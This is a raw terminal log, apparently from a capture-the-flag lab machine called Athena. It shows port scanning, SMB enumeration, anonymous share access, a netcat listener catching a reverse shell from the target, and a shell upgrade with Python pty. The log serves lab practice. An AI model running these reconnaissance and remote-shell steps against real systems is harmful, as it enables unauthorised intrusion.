@@ -1,0 +1,219 @@
+$ nmap -sV -sC  10.10.146.76 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-06 14:26 EST
+Nmap scan report for 10.10.146.76
+Host is up (0.053s latency).
+Not shown: 996 closed tcp ports (conn-refused)
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 3b:c8:f8:13:e0:cb:42:60:0d:f6:4c:dc:55:d8:3b:ed (RSA)
+|   256 1f:42:e1:c3:a5:17:2a:38:69:3e:9b:73:6d:cd:56:33 (ECDSA)
+|_  256 7a:67:59:8d:37:c5:67:29:e8:53:e8:1e:df:b0:c7:1e (ED25519)
+80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Athena - Gods of olympus
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+139/tcp open  netbios-ssn Samba smbd 4.6.2
+445/tcp open  netbios-ssn Samba smbd 4.6.2
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| smb2-time: 
+|   date: 2023-12-06T19:27:10
+|_  start_date: N/A
+|_nbstat: NetBIOS name: ROUTERPANEL, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 18.82 seconds
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~]
+└─$ smbclient -L 10.10.146.76
+Password for [WORKGROUP\kali]:
+session setup failed: NT_STATUS_CONNECTION_DISCONNECTED
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~]
+└─$ enum4linux -U -o -G -S 10.10.146.76           
+Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Dec  6 14:31:06 2023
+
+ =========================================( Target Information )=========================================
+
+Target ........... 10.10.146.76
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ============================( Enumerating Workgroup/Domain on 10.10.146.76 )============================
+                                                                                                                                                                                                                                            
+                                                                                                                                                                                                                                            
+[+] Got domain/workgroup name: SAMBA                                                                                                                                                                                                        
+                                                                                                                                                                                                                                            
+                                                                                                                                                                                                                                            
+ ===================================( Session Check on 10.10.146.76 )===================================
+                                                                                                                                                                                                                                            
+                                                                                                                                                                                                                                            
+[+] Server 10.10.146.76 allows sessions using username '', password ''                                                                                                                                                                      
+                                                                                                                                                                                                                                            
+                                                                                                                                                                                                                                            
+ ================================( Getting domain SID for 10.10.146.76 )================================
+                                                                                                                                                                                                                                            
+Domain Name: SAMBA                                                                                                                                                                                                                          
+Domain Sid: (NULL SID)
+
+[+] Can't determine if host is part of domain or part of a workgroup                                                                                                                                                                        
+                                                                                                                                                                                                                                            
+                                                                                                                                                                                                                                            
+ ===================================( OS information on 10.10.146.76 )===================================
+                                                                                                                                                                                                                                            
+                                                                                                                                                                                                                                            
+[E] Can't get OS info with smbclient                                                                                                                                                                                                        
+                                                                                                                                                                                                                                            
+                                                                                                                                                                                                                                            
+[+] Got OS info for 10.10.146.76 from srvinfo:                                                                                                                                                                                              
+        ROUTERPANEL    Wk Sv PrQ Unx NT SNT Samba 4.15.13-Ubuntu                                                                                                                                                                            
+        platform_id     :       500
+        os version      :       6.1
+        server type     :       0x809a03
+
+
+ =======================================( Users on 10.10.146.76 )=======================================
+                                                                                                                                                                                                                                            
+Use of uninitialized value $users in print at ./enum4linux.pl line 972.                                                                                                                                                                     
+Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 975.
+
+Use of uninitialized value $users in print at ./enum4linux.pl line 986.
+Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 988.
+
+ =================================( Share Enumeration on 10.10.146.76 )=================================
+                                                                                                                                                                                                                                            
+smbXcli_negprot_smb1_done: No compatible protocol selected by server.                                                                                                                                                                       
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        public          Disk      
+        IPC$            IPC       IPC Service (Samba 4.15.13-Ubuntu)
+Reconnecting with SMB1 for workgroup listing.
+Protocol negotiation to server 10.10.146.76 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
+Unable to connect with SMB1 -- no workgroup available
+
+[+] Attempting to map shares on 10.10.146.76                                                                                                                                                                                                
+                                                                                                                                                                                                                                            
+//10.10.146.76/public   Mapping: OK Listing: OK Writing: N/A                                                                                                                                                                                
+
+[E] Can't understand response:                                                                                                                                                                                                              
+                                                                                                                                                                                                                                            
+NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*                                                                                                                                                                                                  
+//10.10.146.76/IPC$     Mapping: N/A Listing: N/A Writing: N/A
+
+ =======================================( Groups on 10.10.146.76 )=======================================
+                                                                                                                                                                                                                                            
+                                                                                                                                                                                                                                            
+[+] Getting builtin groups:                                                                                                                                                                                                                 
+                                                                                                                                                                                                                                            
+                                                                                                                                                                                                                                            
+[+]  Getting builtin group memberships:                                                                                                                                                                                                     
+                                                                                                                                                                                                                                            
+                                                                                                                                                                                                                                            
+[+]  Getting local groups:                                                                                                                                                                                                                  
+                                                                                                                                                                                                                                            
+                                                                                                                                                                                                                                            
+[+]  Getting local group memberships:                                                                                                                                                                                                       
+                                                                                                                                                                                                                                            
+                                                                                                                                                                                                                                            
+[+]  Getting domain groups:                                                                                                                                                                                                                 
+                                                                                                                                                                                                                                            
+                                                                                                                                                                                                                                            
+[+]  Getting domain group memberships:                                                                                                                                                                                                      
+                                                                                                                                                                                                                                            
+enum4linux complete on Wed Dec  6 14:31:16 2023                                                                                                                                                                                             
+
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~]
+└─$ smbclient //10.10.146.76/public
+Password for [WORKGROUP\kali]:
+Anonymous login successful
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Sun Apr 16 20:54:43 2023
+  ..                                  D        0  Sun Apr 16 20:54:05 2023
+  msg_for_administrator.txt           N      253  Sun Apr 16 14:59:44 2023
+
+                19947120 blocks of size 1024. 9693284 blocks available
+smb: \> get msg_for_administrator.txt 
+getting file \msg_for_administrator.txt of size 253 as msg_for_administrator.txt (1.1 KiloBytes/sec) (average 1.1 KiloBytes/sec)
+smb: \> exit
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~]
+└─$ ls                                          
+ 43905.py            cute-alien.jpg         Documents   hydra.restore   index.html.3                note_to_jake.txt   pass.txt         portal.php   reports.json        test               Videos
+ 46635.py            cutie.png              Downloads   index.html      log.txt                    'pass='             picklerick.gif   project      Result              To_agentJ.txt
+ Alien_autospy.jpg   _cutie.png.extracted   hash        index.html.1    msg_for_administrator.txt   pass2.txt          Pictures         project1     rickandmorty.jpeg  'user=anonymous-'
+ Bash_Practice_Two   Desktop                hash1.txt   index.html.2    Music                      'pass=enter'        portal.jpg       Public       Templates           users.bak
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~]
+└─$ cat msg_for_administrator.txt                          
+
+Dear Administrator,
+
+I would like to inform you that a new Ping system is being developed and I left the corresponding application in a specific path, which can be accessed through the following address: /myrouterpanel
+
+Yours sincerely,
+
+Athena
+Intern
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 4444             
+listening on [any] 4444 ...
+connect to [10.8.227.252] from (UNKNOWN) [10.10.146.76] 50946
+
+ls
+index.html
+ping.php
+style.css
+under-construction.html
+/bin/bash -i
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@routerpanel:/var/www/html/myrouterpanel$ export TERM=xterm
+export TERM=xterm
+www-data@routerpanel:/var/www/html/myrouterpanel$ ^Z
+zsh: suspended  nc -lvnp 4444
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~]
+└─$ stty raw -echo; fg
+[1]  + continued  nc -lvnp 4444
+                               ls
+index.html  ping.php  style.css  under-construction.html
+www-data@routerpanel:/var/www/html/myrouterpanel$ ls
+index.html  ping.php  style.css  under-construction.html
+www-data@routerpanel:/var/www/html/myrouterpanel$ cd ..
+www-data@routerpanel:/var/www/html$ ls
+athena.jpg  index.html  myrouterpanel  style.css
+www-data@routerpanel:/var/www/html$ cd /
+www-data@routerpanel:/$ ls
+bin    dev   lib    libx32      mnt   root  snap      sys  var
+boot   etc   lib32  lost+found  opt   run   srv       tmp
+cdrom  home  lib64  media       proc  sbin  swapfile  usr
+www-data@routerpanel:/$ cd var
+www-data@routerpanel:/var$ ls
+backups  crash  local  log   metrics  run   spool  www
+cache    lib    lock   mail  opt      snap  tmp
+www-data@routerpanel:/var$ cd www
+www-data@routerpanel:/var/www$ ls
+html
+www-data@routerpanel:/var/www$ cd html/
+www-data@routerpanel:/var/www/html$ cd myrouterpanel/
+www-data@routerpanel:/var/www/html/myrouterpanel$ ls
+index.html  ping.php  style.css  under-construction.html
+www-data@routerpanel:/var/www/html/myrouterpanel$ cd /home
+www-data@routerpanel:/home$ ls
+athena  ubuntu
+www-data@routerpanel:/home$ cd athena/
+bash: cd: athena/: Permission denied
+
+
+ 
